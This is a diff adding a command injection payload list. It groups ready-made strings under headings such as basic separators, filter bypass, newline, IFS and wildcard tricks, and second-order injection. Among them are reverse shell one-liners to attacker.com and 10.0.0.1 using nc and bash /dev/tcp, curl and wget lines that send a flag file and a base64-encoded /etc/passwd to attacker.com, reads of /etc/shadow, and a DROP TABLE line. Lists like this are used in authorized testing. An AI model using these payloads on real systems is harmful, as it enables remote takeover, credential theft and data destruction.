@@ -1,0 +1,122 @@
+# Command Injection
+# Basic payloads
+; id
+| id
+|| id
+& id
+&& id
+` id `
+$( id )
+| cat /etc/passwd
+; cat /etc/passwd
+
+# Command chaining
+; whoami
+; pwd
+; ls
+; ls -la
+; cat /etc/passwd
+; cat /etc/shadow
+; ifconfig
+
+# Pipe redirection
+| whoami
+| nc -e /bin/sh attacker.com 4444
+| bash -i >& /dev/tcp/attacker.com/4444 0>&1
+
+# Logical operators
+|| whoami
+|| cat /etc/passwd
+&& whoami
+& whoami
+
+# Backtick execution
+`id`
+`whoami`
+`cat /etc/passwd`
+
+# Command substitution $()
+$(id)
+$(whoami)
+$(cat /etc/passwd)
+$(bash -i >& /dev/tcp/10.0.0.1/4444 0>&1)
+
+# Newline injection (bypass)
+%0aid
+%0acat /etc/passwd
+%0aifconfig
+
+# Filter bypass - variable usage
+$PATH
+${PATH}
+`;id;`
+`;whoami;`
+
+# Filter bypass - quoted injection
+"id"
+'id'
+";id;"
+';id;'
+
+# Second order (via stored data)
+'; DROP TABLE users; --
+exec('id');
+
+# Command with arguments
+id ; cat /etc/passwd
+whoami ; ls -la /
+pwd ; echo test
+
+# Error-based injection
+| invalid_cmd_to_see_output
+`invalid_cmd 2>&1`
+
+# Data exfiltration
+; curl http://attacker.com/?flag=$(cat flag.txt)
+; wget -q -O- "http://attacker.com/?$(cat /etc/passwd | base64)"
+
+# Wildcard abuse
+; /bin/c*t /etc/passwd
+; /b?n/id
+; /[b]in/id
+
+# IFS abuse (word separator)
+;IFS=,;cmd=whoami;$cmd
+;IFS=' ';cmd=whoami;$cmd
+
+# Printf bypass
+$(printf '\x62\x61\x73\x68')
+$(printf '%s' whoami)
+
+# Variable reassignment
+;PATH=/bin:$PATH;id
+;SHELL=/bin/bash;$SHELL
+
+# Input redirection
+; id < /dev/null
+; whoami < /dev/null
+
+# Output redirection
+; id > /tmp/output.txt
+; cat /etc/passwd > /tmp/pw.txt
+
+# Reverse shell variations
+; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
+; sh -i >& /dev/udp/10.0.0.1/4444 0>&1
+; nc 10.0.0.1 4444 -e /bin/sh
+; /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
+
+# Semicolon with quotes
+"; id ; "
+'; id ; '
+"; whoami; cat /etc/passwd; "
+
+# Multiple command separators
+|id|
+||id||
+&&id&&
+;id;
+
+# Without spaces (via variable)
+${IFS}id
+$IFS$IFS$IFS$IFS$IFS$IFS$IFS$IFS
